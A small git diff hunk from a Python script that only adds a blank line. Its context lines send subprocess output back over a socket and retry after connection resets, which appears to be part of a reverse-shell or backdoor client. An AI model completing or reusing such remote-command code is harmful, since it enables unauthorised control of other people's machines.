@@ -32,6 +32,7 @@ def main():
                 output = proc.stdout.read()+proc.stderr.read()
                 output_str = str(output)
                 s.send(output_str.encode())
+                
     except ConnectionResetError:
         s.close()
         time.sleep(10)
